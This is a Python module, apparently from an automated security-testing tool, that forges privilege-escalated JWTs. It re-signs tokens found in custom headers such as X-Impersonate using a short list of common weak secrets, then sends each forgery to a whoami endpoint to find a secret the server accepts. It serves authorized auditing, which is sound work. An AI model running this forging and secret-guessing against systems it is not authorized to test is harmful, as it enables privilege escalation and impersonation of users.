"""weak_secret_probe.py — bounded, code-defined dictionary check for a
forgeable custom auth-adjacent header (e.g. X-Impersonate) signed with a
common/app-derived weak secret.

The platform operator explicitly narrowed rbac_role_self_escalation.md's
former blanket "never guess the header's secret" rule (2026-08-13) to permit
exactly this: a SMALL, code-defined dictionary (never LLM-invented, never
hand-authored per target), tried against a header the target's own traffic
already carries. Bounded on every axis:

  - The dictionary is short and fixed (see _COMMON_WEAK_SECRETS) plus a
    handful of names mechanically derived from the app's own hostname --
    never a large wordlist, never per-target hand tuning.
  - The forged token's claims are built by escalating ONLY privilege-shaped
    keys (roles/role/permissions/permission) that already exist in the
    REAL header value observed on the wire -- never inventing a new claim
    name, exactly like self_reverting_mutation never invents a body shape.
  - The forged header is only ever attached to a read-only GET request
    (a "whoami"-style probe). This module performs no mutation, so unlike
    self_reverting_mutation there is nothing to revert.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import logging
from typing import Any

import requests

logger = logging.getLogger(__name__)

_HTTP_TIMEOUT = 10

# Framework/dev defaults seen in the wild for HS256 signing secrets, plus a
# handful of app-hostname-derived guesses assembled in candidate_secrets().
# Deliberately short: this is a plausibility check for a careless default,
# not a wordlist attack.
_COMMON_WEAK_SECRETS = (
    "secret", "changeme", "development", "localhost", "test", "password",
    "your-secret-key", "supersecret", "default", "dev-secret",
)
_PRIVILEGE_CLAIM_KEYS = ("roles", "role", "permissions", "permission")


def candidate_secrets(app_hostname: str) -> list[str]:
    label = str(app_hostname or "").split(".")[0].strip("-")
    derived = []
    if label:
        derived.extend([
            f"{label}-secret", f"{label}-impersonate-localhost",
            f"{label}-jwt-secret", f"{label}_secret", label,
        ])
    # dict.fromkeys dedupes while preserving order (derived guesses first).
    return list(dict.fromkeys(derived + list(_COMMON_WEAK_SECRETS)))


def _b64url_decode(segment: str) -> bytes:
    segment = segment + "=" * (-len(segment) % 4)
    return base64.urlsafe_b64decode(segment.encode())


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def decode_jwt_unverified(token: str) -> tuple[dict[str, Any], dict[str, Any]] | None:
    parts = str(token or "").split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
    except Exception:
        return None
    if not isinstance(header, dict) or not isinstance(payload, dict):
        return None
    return header, payload


def sign_hs256(header: dict[str, Any], payload: dict[str, Any], secret: str) -> str:
    header = {**header, "alg": "HS256"}
    signing_input = (
        f"{_b64url_encode(json.dumps(header, separators=(',', ':')).encode())}."
        f"{_b64url_encode(json.dumps(payload, separators=(',', ':')).encode())}"
    )
    signature = hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest()
    return f"{signing_input}.{_b64url_encode(signature)}"


def escalate_payload_claims(payload: dict[str, Any], elevated_value: Any) -> dict[str, Any]:
    """Only touches claim KEYS already present in the real observed payload
    -- never invents a new claim name -- and only replaces privilege-shaped
    values. Returns the ORIGINAL payload unchanged (by identity) when no
    such claim exists, so the caller can detect "nothing to escalate"."""
    escalated = dict(payload)
    touched = False
    for key in _PRIVILEGE_CLAIM_KEYS:
        if key in escalated:
            escalated[key] = [elevated_value] if isinstance(escalated[key], list) else elevated_value
            touched = True
    return escalated if touched else payload


def find_forgeable_header(headers: dict[str, str]) -> tuple[str, str] | None:
    """A JWT-shaped value under a header name that ISN'T the standard
    Authorization -- the exact shape of the X-Impersonate class of bug: a
    custom, less-scrutinized auth-adjacent header carrying its own token."""
    for name, value in dict(headers or {}).items():
        if str(name).lower() == "authorization":
            continue
        if isinstance(value, str) and decode_jwt_unverified(value):
            return name, value
    return None


def probe_weak_secret(
    *,
    header_name: str,
    header_value: str,
    app_hostname: str,
    whoami_url: str,
    other_headers: dict[str, str],
    cookies: dict[str, str],
    elevated_privilege_value: str,
) -> dict[str, Any]:
    """Try each candidate secret against the observed header's own claim
    shape; stop at the first one the server accepts AND that visibly changes
    the whoami response versus an untouched baseline. Read-only -- attaches
    the forged header to a GET only, never mutates, nothing to revert."""
    decoded = decode_jwt_unverified(header_value)
    if not decoded:
        return {"attempted": False, "reason": "header_not_jwt_shaped"}
    header, payload = decoded
    escalated_payload = escalate_payload_claims(payload, elevated_privilege_value)
    if escalated_payload is payload:
        return {"attempted": False, "reason": "no_privilege_claim_in_observed_token"}

    try:
        baseline = requests.get(whoami_url, headers=other_headers, cookies=cookies, timeout=_HTTP_TIMEOUT, verify=False)
    except Exception as exc:
        return {"attempted": False, "reason": f"baseline_request_failed:{exc}"}

    attempts: list[dict[str, Any]] = []
    for secret in candidate_secrets(app_hostname):
        forged = sign_hs256(header, escalated_payload, secret)
        probe_headers = {**other_headers, header_name: forged}
        try:
            resp = requests.get(whoami_url, headers=probe_headers, cookies=cookies, timeout=_HTTP_TIMEOUT, verify=False)
        except Exception as exc:
            attempts.append({"secret_tried": secret, "error": str(exc)})
            continue
        attempts.append({"secret_tried": secret, "status": resp.status_code})
        if resp.ok and resp.text and resp.text != baseline.text:
            return {
                "attempted": True, "confirmed": True, "secret_found": secret,
                "attempts": attempts, "header_name": header_name,
            }
    return {"attempted": True, "confirmed": False, "attempts": attempts, "header_name": header_name}
